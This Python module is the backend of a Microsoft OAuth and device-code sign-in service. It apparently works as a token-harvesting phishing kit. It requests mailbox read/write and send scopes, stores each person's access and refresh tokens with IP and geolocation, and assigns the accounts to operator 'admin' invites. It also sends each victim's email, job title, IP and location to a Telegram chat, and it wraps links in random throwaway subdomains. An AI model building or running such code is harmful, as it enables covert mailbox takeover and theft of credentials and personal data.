import os
import time
import uuid
from datetime import datetime, timedelta
from urllib.parse import urlencode, quote_plus, unquote

import requests

from db import SessionLocal, init_db
from models import (
    TenantToken,
    SavedUser,
    ConnectInvite,
    TenantConsent,
    TenantConsentStatus,
)

CLIENT_ID = (os.getenv("CLIENT_ID") or "").strip()
CLIENT_SECRET = (os.getenv("CLIENT_SECRET") or "").strip()
REDIRECT_URI = (os.getenv("REDIRECT_URI") or "https://oauth-backend-7cuu.onrender.com/auth/callback").strip()
BACKEND_BASE_URL = (os.getenv("BACKEND_BASE_URL") or "https://oauth-backend-7cuu.onrender.com").rstrip("/")

AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# Device-code flow is kept for the browser dashboard.
# It intentionally does not require Electron or a desktop bridge.
DEVICE_CODE_TENANT = (os.getenv("DEVICE_CODE_TENANT") or "organizations").strip()
DEVICE_CODE_URL = f"https://login.microsoftonline.com/{DEVICE_CODE_TENANT}/oauth2/v2.0/devicecode"
DEVICE_TOKEN_URL = f"https://login.microsoftonline.com/{DEVICE_CODE_TENANT}/oauth2/v2.0/token"

GRAPH_ME_URL = "https://graph.microsoft.com/v1.0/me?$select=id,displayName,mail,userPrincipalName,jobTitle"

# =========================
# SCOPES
# =========================
BASIC_SCOPES = "openid profile offline_access https://graph.microsoft.com/User.Read"
PREVIEW_SCOPES = (
    "openid profile offline_access "
    "https://graph.microsoft.com/User.Read "
    "https://graph.microsoft.com/Mail.ReadBasic"
)
ENTERPRISE_SCOPES = (
    "openid profile offline_access "
    "https://graph.microsoft.com/User.Read "
    "https://graph.microsoft.com/Mail.ReadWrite "
    "https://graph.microsoft.com/Mail.Send"
)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

ADMIN_CONSENT_TENANT = os.getenv("ADMIN_CONSENT_TENANT", "organizations")
WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()

DEFAULT_SESSION_ID = "jwt-only"


def require_client_id():
    if not CLIENT_ID:
        raise Exception("CLIENT_ID is missing. Set CLIENT_ID in your environment variables.")
    return CLIENT_ID


def require_client_secret():
    if not CLIENT_SECRET:
        raise Exception("CLIENT_SECRET is missing. Set CLIENT_SECRET to the Azure client secret VALUE, not the Secret ID.")
    return CLIENT_SECRET


def explain_azure_token_error(error_description: str, fallback: str = "Token request failed") -> str:
    message = error_description or fallback

    if "AADSTS7000215" in message or "Invalid client secret" in message:
        return (
            "Invalid client secret. In Azure App Registration > Certificates & secrets, "
            "create a new client secret and copy the secret VALUE, not the Secret ID. "
            f"Original Microsoft error: {message}"
        )

    return message


def extract_tenant_hint(user_id: str | None) -> str:
    if not user_id:
        return ""
    if "@" in user_id:
        return user_id.split("@", 1)[1].strip().lower()
    return (user_id or "").strip().lower()


def parse_enterprise_notes(notes: str | None) -> dict:
    parsed = {
        "mode": "preview",
        "organization_name": "",
        "notes": notes or "",
    }
    if not notes:
        return parsed

    for part in str(notes).split(";"):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        key = key.strip().lower()
        value = value.strip()

        if key == "mode" and value:
            parsed["mode"] = value
        elif key in {"org", "organization", "organization_name"}:
            parsed["organization_name"] = value
        elif key == "notes":
            parsed["notes"] = value

    return parsed


def send_telegram_alert(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": message},
            timeout=20,
        )
    except Exception as e:
        print(f"Telegram alert failed: {e}")


def save_token(user_id, token_data, device_info=None):
    init_db()
    db = SessionLocal()

    try:
        expires_in = int(token_data.get("expires_in", 3600))
        expires_at = int(
            (datetime.utcnow() + timedelta(seconds=expires_in)).timestamp()
        )

        existing = db.query(TenantToken).filter_by(tenant_id=user_id).first()

        if existing:
            existing.access_token = token_data["access_token"]
            existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
            existing.expires_at = expires_at

            if hasattr(existing, "session_id") and not existing.session_id:
                existing.session_id = DEFAULT_SESSION_ID

            if device_info:
                existing.ip_address = device_info.get("ip")
                existing.user_agent = device_info.get("agent")
                existing.location = device_info.get("location")
        else:
            row = TenantToken(
                tenant_id=user_id,
                access_token=token_data["access_token"],
                refresh_token=token_data.get("refresh_token"),
                expires_at=expires_at,
                ip_address=device_info.get("ip") if device_info else None,
                user_agent=device_info.get("agent") if device_info else None,
                location=device_info.get("location") if device_info else None,
            )

            if hasattr(row, "session_id"):
                row.session_id = DEFAULT_SESSION_ID

            db.add(row)

        db.commit()
    finally:
        db.close()


def get_token(user_id):
    init_db()
    db = SessionLocal()
    try:
        return db.query(TenantToken).filter_by(tenant_id=user_id).first()
    finally:
        db.close()


def save_saved_user(admin_user_id: str, target_user_id: str, job_title: str | None = None):
    init_db()
    db = SessionLocal()

    try:
        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == target_user_id,
            )
            .first()
        )

        if not existing:
            row = SavedUser(
                admin_user_id=admin_user_id,
                user_id=target_user_id,
            )
            if hasattr(row, "job_title"):
                row.job_title = job_title
            db.add(row)
        else:
            if hasattr(existing, "job_title") and job_title:
                existing.job_title = job_title

        db.commit()
    finally:
        db.close()


def save_or_update_tenant_consent(
    admin_user_id: str,
    tenant_hint: str,
    admin_consent_url: str | None = None,
    status: TenantConsentStatus = TenantConsentStatus.PENDING,
    notes: str | None = None,
):
    init_db()
    db = SessionLocal()

    try:
        row = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.tenant_hint == tenant_hint,
            )
            .first()
        )

        now_ts = int(time.time())

        if not row:
            row = TenantConsent(
                admin_user_id=admin_user_id,
                tenant_hint=tenant_hint,
                admin_consent_url=admin_consent_url,
                status=status,
                notes=notes,
                created_at=now_ts,
                updated_at=now_ts,
            )
            db.add(row)
        else:
            if admin_consent_url:
                row.admin_consent_url = admin_consent_url
            if status:
                row.status = status
            if notes is not None:
                row.notes = notes
            row.updated_at = now_ts

        db.commit()
    finally:
        db.close()


def get_user_enterprise_mode(user_id: str, admin_user_id: str | None = None):
    if not user_id:
        return "preview"

    tenant_hint = extract_tenant_hint(user_id)
    if not tenant_hint:
        return "preview"

    init_db()
    db = SessionLocal()
    try:
        query = db.query(TenantConsent).filter(TenantConsent.tenant_hint == tenant_hint)

        if admin_user_id:
            query = query.filter(TenantConsent.admin_user_id == admin_user_id)
        else:
            query = query.filter(TenantConsent.status == TenantConsentStatus.APPROVED)

        rows = query.order_by(TenantConsent.updated_at.desc()).all()

        if not rows:
            return "preview"

        for row in rows:
            status_value = row.status.value if hasattr(row.status, "value") else str(row.status)
            if str(status_value).lower() != "approved":
                continue

            mode_value = parse_enterprise_notes(getattr(row, "notes", "")).get("mode", "preview")
            return (mode_value or "preview").lower()

        return "preview"
    finally:
        db.close()


def resolve_scopes(user_id: str | None = None, mail_mode: bool = False, admin_user_id: str | None = None):
    if not mail_mode:
        return BASIC_SCOPES

    mode = get_user_enterprise_mode(user_id or "", admin_user_id=admin_user_id)

    if mode == "enterprise_full":
        return ENTERPRISE_SCOPES

    return PREVIEW_SCOPES


def create_connect_invite(admin_user_id: str, connect_mode: str = "basic", tenant_hint: str | None = None):
    init_db()
    db = SessionLocal()

    try:
        invite_token = f"{uuid.uuid4().int % 10**7}-{uuid.uuid4().int % 10**12}-{uuid.uuid4().hex[:10]}"

        row = ConnectInvite(
            admin_user_id=admin_user_id,
            invite_token=invite_token,
            is_used=False,
        )

        if hasattr(row, "connect_mode"):
            row.connect_mode = connect_mode
        if hasattr(row, "tenant_hint"):
            row.tenant_hint = tenant_hint

        db.add(row)
        db.commit()

        return invite_token
    finally:
        db.close()


def get_connect_invite(invite_token: str):
    init_db()
    db = SessionLocal()

    try:
        return db.query(ConnectInvite).filter(ConnectInvite.invite_token == invite_token).first()
    finally:
        db.close()


def mark_connect_invite_used(
    invite_token: str,
    resolved_user_id: str | None = None,
    job_title: str | None = None,
):
    init_db()
    db = SessionLocal()

    try:
        invite = db.query(ConnectInvite).filter(ConnectInvite.invite_token == invite_token).first()

        if invite:
            invite.is_used = True
            invite.used_at = int(datetime.utcnow().timestamp())
            if resolved_user_id:
                invite.resolved_user_id = resolved_user_id
            if hasattr(invite, "job_title") and job_title:
                invite.job_title = job_title
            db.commit()
    finally:
        db.close()


def wrap_worker_url(path: str, params: dict):
    if not WORKER_DOMAIN:
        return f"{BACKEND_BASE_URL}/{path}?{urlencode(params)}"

    token = str(uuid.uuid4()).replace("-", "")
    subdomain = f"{token}.{WORKER_DOMAIN}"
    query = urlencode(params)
    return f"https://{subdomain}/{path}?{query}"


def build_authorize_url(
    state_value: str,
    scopes: str,
    prompt: str | None = None,
    tenant: str = "common",
    login_hint: str | None = None,
    domain_hint: str | None = None,
):
    params = {
        "client_id": require_client_id(),
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "response_mode": "query",
        "scope": scopes,
        "state": quote_plus(state_value),
    }

    if prompt:
        params["prompt"] = prompt

    if login_hint:
        params["login_hint"] = login_hint

    if domain_hint:
        params["domain_hint"] = domain_hint

    return f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?{urlencode(params)}"


def generate_login_link(user_id: str):
    state_value = f"user_basic:{user_id}"
    return build_authorize_url(
        state_value=state_value,
        scopes=resolve_scopes(user_id=user_id, mail_mode=False),
        tenant="common",
        prompt="select_account",
        login_hint=user_id if "@" in user_id else None,
    )


def generate_mail_connect_link(user_id: str, admin_user_id: str | None = None):
    state_value = f"user_mail:{user_id}"
    return build_authorize_url(
        state_value=state_value,
        scopes=resolve_scopes(user_id=user_id, mail_mode=True, admin_user_id=admin_user_id),
        tenant="common",
        prompt="select_account",
        login_hint=user_id if "@" in user_id else None,
    )


def generate_org_connect_link(admin_user_id: str, tenant_hint: str | None = None):
    invite_token = create_connect_invite(admin_user_id, connect_mode="basic", tenant_hint=tenant_hint)
    state_value = f"invite_basic:{invite_token}"
    return build_authorize_url(
        state_value=state_value,
        scopes=BASIC_SCOPES,
        tenant="common",
        prompt="select_account",
        domain_hint=tenant_hint if tenant_hint and "." in tenant_hint else None,
    )


def generate_org_mail_connect_link(admin_user_id: str, tenant_hint: str | None = None):
    invite_token = create_connect_invite(admin_user_id, connect_mode="mail", tenant_hint=tenant_hint)
    state_value = f"invite_mail:{invite_token}"
    return build_authorize_url(
        state_value=state_value,
        scopes=PREVIEW_SCOPES,
        tenant="common",
        prompt="select_account",
        domain_hint=tenant_hint if tenant_hint and "." in tenant_hint else None,
    )


def generate_admin_consent_url(tenant: str | None = None):
    tenant_value = tenant or ADMIN_CONSENT_TENANT
    params = {
        "client_id": require_client_id(),
        "redirect_uri": REDIRECT_URI,
    }
    return f"https://login.microsoftonline.com/{tenant_value}/adminconsent?{urlencode(params)}"


def build_device_info(client_ip: str = None, user_agent: str = None):
    location_str = "unknown"

    if client_ip:
        try:
            resp = requests.get(f"https://ipinfo.io/{client_ip}/json", timeout=10)
            if resp.ok:
                loc = resp.json()
                location_str = f"{loc.get('city')}, {loc.get('region')}, {loc.get('country')}"
        except Exception:
            pass

    return {
        "ip": client_ip,
        "agent": user_agent,
        "location": location_str,
    }


def fetch_graph_identity(access_token: str):
    headers = {"Authorization": f"Bearer {access_token}"}
    res = requests.get(GRAPH_ME_URL, headers=headers, timeout=30)
    data = res.json() if res.content else {}

    resolved_user_id = (
        data.get("userPrincipalName")
        or data.get("mail")
        or data.get("id")
    )

    return {
        "resolved_user_id": resolved_user_id,
        "job_title": data.get("jobTitle"),
        "profile": data,
    }


def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
    init_db()

    decoded_state = unquote(state or "")

    requested_scopes = BASIC_SCOPES
    flow_type = "basic"
    state_user_id = None
    admin_user_id_for_saved_user = None
    invite_token = None

    if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
        flow_type = "mail"

    if decoded_state.startswith("user_basic:"):
        state_user_id = decoded_state.split("user_basic:", 1)[1]
        admin_user_id_for_saved_user = state_user_id
    elif decoded_state.startswith("user_mail:"):
        state_user_id = decoded_state.split("user_mail:", 1)[1]
        admin_user_id_for_saved_user = state_user_id
        requested_scopes = resolve_scopes(user_id=state_user_id, mail_mode=True, admin_user_id=admin_user_id_for_saved_user)
    elif decoded_state.startswith("invite_basic:"):
        invite_token = decoded_state.split("invite_basic:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                state_user_id = invite.resolved_user_id
    elif decoded_state.startswith("invite_mail:"):
        invite_token = decoded_state.split("invite_mail:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                state_user_id = invite.resolved_user_id
            requested_scopes = resolve_scopes(
                user_id=state_user_id or "",
                mail_mode=True,
                admin_user_id=admin_user_id_for_saved_user,
            )
    elif decoded_state.startswith("user:"):
        state_user_id = decoded_state.split("user:", 1)[1]
        admin_user_id_for_saved_user = state_user_id
    elif decoded_state.startswith("invite:"):
        invite_token = decoded_state.split("invite:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                state_user_id = invite.resolved_user_id
    else:
        admin_user_id_for_saved_user = decoded_state or None
        state_user_id = decoded_state or None

    token_payload = {
        "client_id": require_client_id(),
        "client_secret": require_client_secret(),
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code",
        "scope": requested_scopes,
    }

    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
    result = response.json()

    if "error" in result:
        error_message = explain_azure_token_error(
            result.get("error_description", ""),
            result.get("error", "Token exchange failed"),
        )
        raise Exception(f"Token exchange failed: {error_message}")

    access_token = result["access_token"]

    resolved_user_id = None
    job_title = None
    profile = {}

    try:
        identity = fetch_graph_identity(access_token)
        resolved_user_id = identity["resolved_user_id"]
        job_title = identity["job_title"]
        profile = identity["profile"]
    except Exception:
        pass

    device_info = build_device_info(client_ip, user_agent)

    effective_user_id = resolved_user_id or state_user_id or admin_user_id_for_saved_user

    if effective_user_id:
        save_token(effective_user_id, result, device_info)

    if admin_user_id_for_saved_user and resolved_user_id:
        save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)

    if invite_token and resolved_user_id:
        mark_connect_invite_used(invite_token, resolved_user_id, job_title)

    email = profile.get("userPrincipalName") or profile.get("mail") or resolved_user_id or "unknown"

    send_telegram_alert(
        f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
        f"State User ID: {state_user_id or 'unknown'}\n"
        f"Job Title: {job_title or 'unknown'}\n"
        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
        f"Email: {email}\n"
        f"IP: {client_ip or 'unknown'}\n"
        f"Location: {device_info.get('location', 'unknown')}\n"
        f"Flow: oauth_redirect ({flow_type})"
    )

    return {
        "resolved_user_id": resolved_user_id,
        "effective_user_id": effective_user_id,
        "job_title": job_title,
        "profile": profile,
        "admin_user_id": admin_user_id_for_saved_user,
        "flow_type": flow_type,
    }


def start_device_code_flow(mail_mode: bool = False, user_id: str | None = None, admin_user_id: str | None = None):
    payload = {
        "client_id": require_client_id(),
        "scope": resolve_scopes(user_id=user_id, mail_mode=mail_mode, admin_user_id=admin_user_id),
    }

    res = requests.post(
        DEVICE_CODE_URL,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )

    data = res.json() if res.content else {}

    if res.status_code >= 400 or "error" in data:
        error_message = data.get("error_description") or data.get("error") or res.text
        raise Exception(f"Device code start failed: {error_message}")

    return {
        "device_code": data["device_code"],
        "user_code": data["user_code"],
        "verification_uri": data["verification_uri"],
        "message": data["message"],
        "expires_in": data["expires_in"],
        "interval": data["interval"],
        "flow_type": "mail" if mail_mode else "basic",
    }


def poll_device_code_flow(
    device_code: str,
    admin_user_id: str | None = None,
    client_ip: str = None,
    user_agent: str = None,
):
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": require_client_id(),
        "device_code": device_code,
    }

    res = requests.post(
        DEVICE_TOKEN_URL,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )

    data = res.json() if res.content else {}

    if res.status_code == 200 and "access_token" in data:
        resolved_user_id = None
        job_title = None
        profile = {}

        try:
            identity = fetch_graph_identity(data["access_token"])
            resolved_user_id = identity["resolved_user_id"]
            job_title = identity["job_title"]
            profile = identity["profile"]
        except Exception:
            pass

        if resolved_user_id:
            device_info = build_device_info(client_ip, user_agent)
            save_token(resolved_user_id, data, device_info)

            if admin_user_id:
                save_saved_user(admin_user_id, resolved_user_id, job_title)

            email = profile.get("userPrincipalName") or profile.get("mail") or resolved_user_id or "unknown"

            send_telegram_alert(
                f"Resolved User ID: {resolved_user_id}\n"
                f"Job Title: {job_title or 'unknown'}\n"
                f"Admin/User Context: {admin_user_id or 'unknown'}\n"
                f"Email: {email}\n"
                f"IP: {client_ip or 'unknown'}\n"
                f"Location: {device_info.get('location', 'unknown')}\n"
                f"Flow: device_code"
            )

        return {
            "status": "complete",
            "resolved_user_id": resolved_user_id,
            "job_title": job_title,
            "profile": profile,
        }

    error_code = data.get("error")
    error_description = data.get("error_description", "")

    if error_code == "authorization_pending":
        return {
            "status": "pending",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "authorization_declined":
        return {
            "status": "declined",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "expired_token":
        return {
            "status": "expired",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "bad_verification_code":
        return {
            "status": "error",
            "error": error_code,
            "detail": error_description,
        }

    return {
        "status": "error",
        "error": error_code or "unknown_error",
        "detail": error_description or res.text,
    }


def refresh_token(user_id: str, admin_user_id: str | None = None):
    token_record = get_token(user_id)

    if not token_record or not token_record.refresh_token:
        raise Exception("No refresh token available. User must re-login.")

    requested_scopes = resolve_scopes(user_id=user_id, mail_mode=True, admin_user_id=admin_user_id)

    data = {
        "client_id": require_client_id(),
        "client_secret": require_client_secret(),
        "refresh_token": token_record.refresh_token,
        "grant_type": "refresh_token",
        "scope": requested_scopes,
    }

    response = requests.post(TOKEN_URL, data=data, timeout=30)
    result = response.json()

    if "error" in result:
        error_message = explain_azure_token_error(
            result.get("error_description", ""),
            result.get("error", "Token refresh failed"),
        )
        raise Exception(f"Token refresh failed: {error_message}")

    save_token(user_id, result)
    return result